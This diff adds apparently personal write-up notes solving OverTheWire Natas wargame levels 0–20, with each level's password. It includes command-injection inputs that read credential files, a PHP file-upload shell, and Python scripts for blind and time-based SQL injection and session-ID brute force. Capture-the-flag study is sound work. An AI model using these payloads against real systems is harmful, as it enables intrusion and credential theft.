@@ -1,0 +1,605 @@
+natas0:
+	View source.
+
+	right click on page -> view source
+	pw in source
+
+	0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq
+
+
+natas1:
+
+	Force view source.
+
+	view-source:http://natas1.natas.labs.overthewire.org/
+	pw in source
+
+	TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI
+
+
+natas2:
+
+	Directory enumeration.
+
+	view source
+	source shows path to <img src="files/pixel.png">
+	navigating to just <url>/files shows users.txt
+	pw in users.txt
+
+	3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
+
+
+natas3:
+
+	Robots.txt/directory enumeration.
+
+	check robots.txt
+	robots.txt disallows directory s3cr3t
+	check <url>/s3cr3t for users.txt
+	pw in users.txt
+
+	QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
+
+
+natas4:
+
+	Edit http request.
+
+	open dev tools (shift f5)
+	check http request header
+	edit header and update referer
+		Referer: http://natas5.natas.labs.overthewire.org/
+	resend header
+	check response
+	
+	Firefox:
+		edit and resend no longer supports editing referer by default
+		change devtools.netmonitor.features.newEditAndResend to false in about:config
+		right click http request and select "edit and resend"
+		update referer
+		resend header
+		check response in dev tools
+		
+	Firefox + Curl:
+		Right click https response and select Copy Value > Copy as Curl
+		Paste in terminal
+		Update referer
+		resend header
+		check response in terminal
+		
+	0n35PkggAPm2zbEpOU802c0x0Msn1ToK
+
+
+natas5:
+
+	Cookie manipulation.
+
+	check cookies
+	edit "logged in" cookie to value of 1
+	refresh
+
+	0RoJwHdSKWFTYR5WuiAewauSuNaBXned
+
+
+natas6:
+
+	Directory enumeration.
+
+	click "view sourcecode" link to view embedded php code
+	notice file inclusion in source code:
+		"/includes/secret.inc"
+	view source of http://natas6.natas.labs.overthewire.org/includes/secret.inc
+	secret in source: FOEIUWGHFEEUHOFUOIU
+	submit secret on index page
+
+	bmg8SvU1LizuWjx3y7xkNERkHxGre0GS
+
+
+natas7:
+
+	Local File Inclusion
+
+	view source for index.php in debugger
+	notice hint in source:
+		"<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->"
+
+	open "about" page
+	notice php parameter in url:
+		http://natas7.natas.labs.overthewire.org/index.php?page=about
+
+	attempt local file inclusion (LFI): 
+		http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
+
+	xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q
+
+
+natas8:
+
+	Reverse encoding.
+
+	click "view sourcecode" link to view embedded php code
+
+	notice stored encoded secret
+		$encodedSecret = "3d3d516343746d4d6d6c315669563362";
+
+	notice submitted secret encoding method
+		return bin2hex(strrev(base64_encode($secret)));
+	
+	reverse this method with encoded secret
+		encoded_secret > hex to ascii > string reverse > base64 to ascii = secret
+		echo base64_decode(strrev(hex2bin('3d3d516343746d4d6d6c315669563362')));
+
+	secret: oubWYf2kBq
+
+	ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
+
+
+natas9:
+	Command injection through unsanitized form input.
+
+	click "view sourcode" to view embedded php code
+
+	notice that form value is stored as $key
+	serverside command is then run using the value of key:
+		grep -i $key dictionary.txt
+	
+	Arbitrary command injection can be performed by entering a string that breaks out of the coded command:
+		$key = "; whoami #"
+			runs as
+		grep -i ; whoami # dictionary.txt
+			returns
+		natas9
+
+	; ends the initial command and begins a new one
+	# comments out "dictionary.txt so that the injected command execute cleanly
+	
+	since passwords are stored in /etc/natas_webpass/:
+		enter "; cat /etc/natas_webpass/natas10 #" in search field
+	
+	t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
+
+
+natas10:
+
+	Comand injection through form input.
+
+	click "view sourcode" to view embedded php code
+	notice that previously used special characters used for command injection are filtered
+
+	enter "test; whoami" in search field
+	notice that the search query is is displayed in the address bar
+	notice also the the semicolon has been convered into html encoding as %3B
+	We can inject an html encoded newline to achieve RCI
+		"" %0A cat /etc/natas_webpass/natas11 #
+			runs as
+		grep -i "" %0A cat /etc/natas_webpass/natas11 # dictionary.txt
+	
+		"" completes the grep command
+		%0A is transtaled as a newline character, treating the next part of the string as a new command
+		# comments our dictionary.txt 
+	
+	1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg
+
+natas11:
+
+	Reverse engineer cookie + XOR key recovery.
+
+	Hint on index page indicates that solution involves xor encryption and cookies
+
+	Click on 'view sourcecode'
+	Notice:
+		Cookie stores values:
+			showpassword
+			bgcolor
+		If showpassword = yes then prints password for natas12
+		Default data is hardcoded as:
+			$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
+		Showpassword is not affected by form submission
+
+		We need to create a new cookie with value: showpassword = yes
+		Cookie data is encrypted with:
+			json_encode() => xor_encrypt() => base64_encode()
+		We will need the xor key to properly encrypt our new cookie.
+	
+	Recover xor key:
+		We can recover the key by xoring the plaintext (default value -> json_encode()) and encypted text (current cookie -> base64_decode()) of the message.
+			<?php
+			$plaintext = json_encode(array( "showpassword"=>"no", "bgcolor"=>"#ffffff"));
+			$encryptedtext = base64_decode("HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg=");
+			echo $plaintext ^ $encryptedtext;
+			?>
+	
+			result:  eDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoe
+		
+		Key =  eDWo
+	
+	Generate new cookie with showpassword = yes:
+		1.
+			<?php
+			$text = json_encode(array( "showpassword"=>"yes", "bgcolor"=>"#ffffff"));
+			$key = 'eDWo';
+	
+			for($i=0;$i<strlen($text);$i++) {
+				$cookie .= $text[$i] ^ $key[$i % strlen($key)];
+			}
+
+			echo base64_encode($cookie);
+			?>
+		2. Result:
+			 HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5 
+
+	Set cookie in devtools and reload page:
+		Password for natas 12:
+			yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB
+	
+	yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB
+
+natas12:
+
+	Bypass file upload restricitons (edit post request).
+
+	Hint on index page indicates upload of jpeg files is allowed.
+	
+	Upload random file.
+	Notice:
+		Uploaded file is assigned random filename and .jpg extension
+		File is accessible on the server at <server_url>/uploads/<filename>
+	
+	Click on 'view sourcecode'
+	Notice:
+		Uploaded files are assigned random filename with extenstion .jpg
+	
+	Solution:
+		We can edit http request to submit php file with code to return password for Natas 13
+		
+		1. Write php file with code to reveal Natas 13 password
+			<?php
+			system("cat /etc/natas_webpass/natas13");
+			?>
+		2. Open devtools in firefox, view network tab.
+		3. Upload file via upload form
+		4. Right click http POST request and select "Edit and Resend"
+			a. In request body under 'Content-Disposition: form-data; name="filename"':
+				Change filename extension to .php
+			b. Send
+		5. Select new POST request in network view to view the response
+		6. Copy generated filename (should have php extension) and navigate to in browser address bar		
+				
+	trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
+
+
+natas13:
+
+	Bypass file upload restrictions (Magic bytes).
+	
+	Like the previous challenge, hint on index page indicates upload of jpeg files is allowed.
+	
+	Upload a non-image file.
+	Notice:
+		We now get an error, "File is not an image."
+		
+	Click on 'view sourcecode'
+	Notice:
+		1. The code still sets a random filename and .jpg extension
+		2. The code now checks for to see if the file is an image.
+			} else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
+			        echo "File is not an image";
+			        
+	Looking up exif_imagetype() method shows that it checks the byte signature of a file to determine if it
+	matches a known image type.
+	
+	Examine https://en.wikipedia.org/wiki/List_of_file_signatures for the byte signature of a jpg:
+		FF D8 FF DB
+		
+	Solution:
+		We can change the byte signature of our file to match a jpg using a hex editor then upload as in
+		the previous challenge.
+	
+		1. Write php file with code to reveal Natas 13 password.
+		   (Include an empty line at the top for padding. (Altering the signature will change this line):
+		
+			<?php
+			system("cat /etc/natas_webpass/natas13");
+			?>			
+		2. Open File in hex-editor and change the first four bytes to match a jpg signature:
+			FF D8 FF DB		
+		   File contents after modifying with hex editor:
+			����
+			<?php 
+			echo system("cat /etc/natas_webpass/natas14"); 
+			?>
+		3. Open devtools in firefox, view network tab.
+		4. Upload file via upload form
+		5. Right click http POST request and select "Edit and Resend"
+			a. In request body under 'Content-Disposition: form-data; name="filename"':
+				Change filename extension to .php
+			b. Send
+		6. Select new POST request in network view to view the response
+		7. Copy generate filename (should have php extension) and navigate to in browaser address bar
+	
+	z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
+
+
+natas14:
+
+	SQL injection.
+
+	We are presented with a form with fields for a username and password along with a login button.
+	
+	Click on 'view sourcecode'
+	Notice:
+		1. The username and password are used as part of a SQL query:
+			SELECT * from users where username="<username>" and password="<password>"
+		2. If the query returns 1 or more rows of results the password for Natas 15 will be printed:
+			if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
+            			echo "Successful login! The password for natas15 is <censored><br>";
+		
+	Solution:
+		We can perform a SQL injection against the form to reveal the password.
+			
+		1. Enter username:
+			""
+		2. Enter password:
+			" or "1"="1
+		3. Our query becomes:
+			SELECT * from users where username="" and password="" or "1"="1"
+		4. The AND operator is evaluated before the OR operator and the query is logically evaluated as:
+		   	SELECT * from users where ((username="" and password="") or ("1"="1"))
+	   	5. Since 1=1 is TRUE the query becomes:
+	   		SELECT * from users where TRUE
+		6. This will return all rows in the users table and reveal the Natas15 password
+		   		
+	
+	SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
+
+natas15:
+
+	SQL injection + password brute force
+	
+	Click on 'view sourcecode'
+	Notice:
+		1. Page comments indicates 'users' table consists of usernames and passwords.
+			/*
+			CREATE TABLE `users` (
+			  `username` varchar(64) DEFAULT NULL,
+			  `password` varchar(64) DEFAULT NULL
+			);
+			*/
+		2. Username is part of sql query:
+			$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
+		3. App will confirm if SQL query returns results but not does not shows  results and doest not print password
+			if(mysqli_num_rows($res) > 0) {
+	      			echo "This user exists.<br>";
+    			} else {
+				echo "This user doesn't exist.<br>";
+    			}
+			} else {
+				echo "Error in query.<br>";
+			}
+			
+	Solution:
+		We can perform a SQL injection against the form to brute force the password using a python script.
+		Note: we can restrict the password to a length of 3 chars based on prior Natas passwords.
+			import requests
+
+			url = 'http://natas15.natas.labs.overthewire.org/'
+			charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
+
+
+			password = ''
+
+			while len(password) < 32:
+			    for c in charset:
+				payload = ('natas16" AND password LIKE BINARY "' + password + c + '%" "')
+				r = requests.get(url, auth=('natas15','SdqIqBsFcz3yotlNYErZSZwblkm0lrvx'),  params={"username": payload})
+				if "This user exists" in r.text:
+				    password += c
+				    print (password)
+				    break
+
+	hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
+
+natas16:
+
+	Command injection/password brute force
+	
+	Click on 'view sourcecode'
+	Notice: 
+
+		1. Previously used special characters used for command injection are filtered
+		2. Search field ($key) entries are sanitized in quotes forcing them to be interpreted as a string
+			passthru("grep -i \"$key\" dictionary.txt");
+		3. $, (, and ) characters a still allowed.
+		
+	Solution:
+		1. Can construct commands that will excecute using $(command) syntax.
+		2. Result of $(command) will be processed as arg for grep command
+		3. Strings not found in dictionary result in an empty page.
+		
+		Can use these to brute force password in /etc/natas_webpass/natas17
+			1. Iteratively search for valid characters in /etc/natas_webpass/natas17
+			2. Append a valid string (zigzag) to the end of $(command)
+				Gives an empty result if char is found in password
+				Gives page with zigag if char is not found in password
+			3. Iterate through 32 character pasword on character at a time.
+			
+		import requests
+
+		charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
+		password = ''
+
+		for i in range(33):
+		    for c in charset:
+			r = requests.get(f'http://natas16.natas.labs.overthewire.org/?needle=$(grep ^{password}{c}.* /etc/natas_webpass/natas17)zigzag&submit=Search', auth=('natas16', 'hPkjKYviLQctEW33QmuXL6eDVfMW4sGo'))
+			if r.text.find('zigzag') == -1:
+			    password += c
+			    print(password)
+			    break
+        
+		print("Done!")		
+	
+EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
+
+natas17:
+
+	Blind SQL Injeciton
+	
+	Click on 'view sourcecode'
+	Notice:
+		1. Same as natas 15 except no output is provided to indicate valid and invalid reponses.
+		
+	Solution:
+		1. Blind SQL injection
+		2. SQL SLEEP commands can be included as part of SQL injection playload
+		3. SQl commands including valid password strings with wait for the SLEEP length before returning results.
+		4. This can be used as a valid/invalid check by setting the request timeout less that the sleep length.
+		5. Requests that timeout will indicate valid password characters.
+		
+		import requests
+
+		url = 'http://natas17.natas.labs.overthewire.org/'
+		charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
+
+		password = ''
+
+		while len(password) < 32:
+		    for c in charset:
+			try:
+			    payload = ('natas18" AND password LIKE BINARY "' + password + c + '%" AND SLEEP(5)--"')
+			    r = requests.get(url, auth=('natas17','EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC'), params={"username": payload}, timeout=1)
+			except requests.Timeout:
+			    password += c
+			    print (password)
+			    break
+	
+6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
+
+natas18:
+
+	Session ID Brute Force
+	
+	Click on 'view sourcecode'
+	Notice:
+	
+		1. Session id max value is small enough to brute force
+			$maxid = 640; // 640 should be enough for everyone
+		2. Page returns 'You are an admin' on successful login with admin session id
+			
+
+	Solution:
+		1. Brute force session id with python
+		
+		import requests
+
+		url = 'http://natas18.natas.labs.overthewire.org'
+		cookies = dict()
+
+		for x in range(640):
+		    print("PHPSESSID: " + str(x))
+		    cookies = dict(PHPSESSID=str(x))
+		    r = requests.get(url, auth=('natas18', '6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ'), cookies=cookies)
+		    if "You are an admin" in r.text:
+			print(r.text)
+			break
+		
+tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr
+
+natas19:
+
+	Session ID Decode + Brute Force
+
+	Notice:	
+		1. Hint says that code is the same as antas18 except sessions ids are not longer sequential.
+		2. Hint says we need to be logged in as admin
+		2. Logging into portal as admin with random password provides session cookie
+		3. Cookie is hex encoded ascii
+			164-admin
+		
+	Solution
+		1. Modify natas18 script to append "-admin" to session id and encode in hex.
+		2. Brute force the 3 digit if prefix as before.
+		
+		import requests
+
+		url = 'http://natas19.natas.labs.overthewire.org'
+		cookies = dict()
+
+		for x in range(640):
+		    plaintext = ''
+		    s_id = ''
+
+		    plaintext = str(x) + '-admin'
+		    print("PHPSESSIO: " + plaintext)
+		    for c in plaintext:
+			s_id += c.encode('utf-8').hex()
+		    print("PHPSESSID: " + s_id)
+		    cookies = dict(PHPSESSID=s_id)
+		    r = requests.get(url, auth=('natas19', 'tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr'), cookies=cookies)
+		    if "You are an admin" in r.text:
+			print(r.text)
+			break
+
+	
+p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw
+
+natas20:
+
+	Session ID
+	
+	Click on 'view sourcecode'
+	Notice:
+		1. The app requires an key:value pair of admin:1 in the session id to provide the password for the next level
+			...
+			if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
+				print "You are an admin. The credentials for the next level are:<br>";
+				print "<pre>Username: natas21\n";
+				print "Password: <censored></pre>";
+				}
+			...
+			
+		2. Session data content is delimeted by \n characters, and..
+		3. Each line of session data is further defined as "key value" pairs separated by a single space , Ex: "admin 1".
+			
+			$_SESSION = array();
+			foreach(explode("\n", $data) as $line) {
+				...
+				$parts = explode(" ", $line, 2);
+				if($parts[0] != "")
+					$_SESSION[$parts[0]] = $parts[1];
+			}
+			
+		4. A new session is created whenever a name parameter is submitted, and..
+		5. The name parameter is not sanitized.
+		
+			if(array_key_exists("name", $_REQUEST)) {
+				$_SESSION["name"] = $_REQUEST["name"];
+				
+	Solution:
+		1. Using the name change feature we can create a new 'admin' session
+		2. Because name input is not sanitized we can use our knowledge of session data formatting to inject an additional 'admin 1' parameter/value.
+			params = dict(name='admin\nadmin 1', debug='')
+		3. After the new session is created we need to grab the new session key and submit a new request with that key.
+		
+		import requests
+
+		url = 'http://natas20.natas.labs.overthewire.org'
+		auth = ('natas20', 'p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw')
+		params = dict(name='admin\nadmin 1')
+		cookies = dict()
+		r = requests.get(url, auth=auth, params=params, cookies=cookies)
+		print(r.text)
+		print('')
+
+		s_id = r.cookies['PHPSESSID']
+		print('PHPSESSID: ' + s_id)
+		print('')
+
+		cookies = dict(PHPSESSID=s_id)
+		r= requests.get(url, auth=auth, params=params, cookies=cookies)
+		print(r.text)
+		
+	BPhv63cKE1lkQl04cE5CuFTzXe15NfiH
+
+
+		
+	
